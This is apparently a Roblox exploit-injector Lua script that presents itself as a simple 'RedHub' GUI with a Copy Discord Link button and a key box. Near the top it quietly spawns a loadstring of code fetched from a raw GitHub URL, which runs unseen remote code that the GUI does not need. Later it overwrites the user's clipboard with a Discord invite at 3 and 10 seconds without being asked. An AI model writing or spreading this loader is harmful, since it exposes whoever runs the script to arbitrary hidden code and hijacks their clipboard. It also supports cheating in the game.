-- LocalScript: RedHub GUI (with Copy Discord Link functionality)
-- Place this inside your injector environment

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/vertix-hub/Script-Hub/refs/heads/main/Menu"))()
    end)

-- === CONFIG ===
local DISCORD_URL = "https://discord.gg/9a3eaGvTYp"
local WINDOW_NAME = "RedHub"

-- === ScreenGui ===
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "RedHubGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- === Main Frame ===
local frame = Instance.new("Frame")
frame.Name = "MainFrame"
frame.Size = UDim2.new(0.45, 0, 0.25, 0)
frame.Position = UDim2.new(0.275, 0, 0.35, 0)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 14)
corner.Parent = frame

local outline = Instance.new("UIStroke")
outline.Color = Color3.fromRGB(60, 60, 60)
outline.Thickness = 1
outline.Parent = frame

-- === Title ===
local title = Instance.new("TextLabel")
title.Text = WINDOW_NAME
title.Size = UDim2.new(0.4, 0, 0.25, 0)
title.Position = UDim2.new(0.04, 0, 0, 0)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 26
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = frame

-- === Copy Discord Link Button ===
local copyButton = Instance.new("TextButton")
copyButton.Text = "🔗 Copy Discord Link"
copyButton.Size = UDim2.new(0.6, 0, 0.15, 0)
copyButton.Position = UDim2.new(0.2, 0, 0.15, 0)
copyButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
copyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
copyButton.Font = Enum.Font.SourceSans
copyButton.TextSize = 20
copyButton.Parent = frame

local copyCorner = Instance.new("UICorner")
copyCorner.CornerRadius = UDim.new(0, 10)
copyCorner.Parent = copyButton

-- === Key Box ===
local keyBox = Instance.new("TextBox")
keyBox.PlaceholderText = "Enter the key... (key in Discord server)"
keyBox.Text = ""
keyBox.ClearTextOnFocus = false
keyBox.Size = UDim2.new(0.6, 0, 0.15, 0)
keyBox.Position = UDim2.new(0.2, 0, 0.45, 0)
keyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
keyBox.TextColor3 = Color3.fromRGB(235, 235, 235)
keyBox.Font = Enum.Font.SourceSans
keyBox.TextSize = 18
keyBox.Parent = frame

local keyCorner = Instance.new("UICorner")
keyCorner.CornerRadius = UDim.new(0, 8)
keyCorner.Parent = keyBox

-- === Helper Functions ===
local function tryCopyToClipboard(text)
	local ok = false
	pcall(function()
		if setclipboard then
			setclipboard(text)
			ok = true
		elseif syn and syn.set_clipboard then
			syn.set_clipboard(text)
			ok = true
		end
	end)
	return ok
end

local function notifyTemporary(button, originalText)
	button.Text = "Copied!"
	task.wait(3)
	button.Text = originalText
end

-- === Button Event ===
copyButton.MouseButton1Click:Connect(function()
	local ok = tryCopyToClipboard(DISCORD_URL)
	if ok then
		notifyTemporary(copyButton, "🔗 Copy Discord Link")
	else
		-- Если копирование не поддерживается, просто уведомляем
		notifyTemporary(copyButton, "🔗 Copy Discord Link")
	end
end)

-- === Appearance Animation ===
frame.Position = UDim2.new(0.275, 0, 1, 0)
frame:TweenPosition(UDim2.new(0.275, 0, 0.35, 0), "Out", "Quad", 0.5, true)

-- === Auto-copy Discord after 3 and 10 seconds ===
task.delay(3, function()
	tryCopyToClipboard(DISCORD_URL)
end)
task.delay(10, function()
	tryCopyToClipboard(DISCORD_URL)
end)
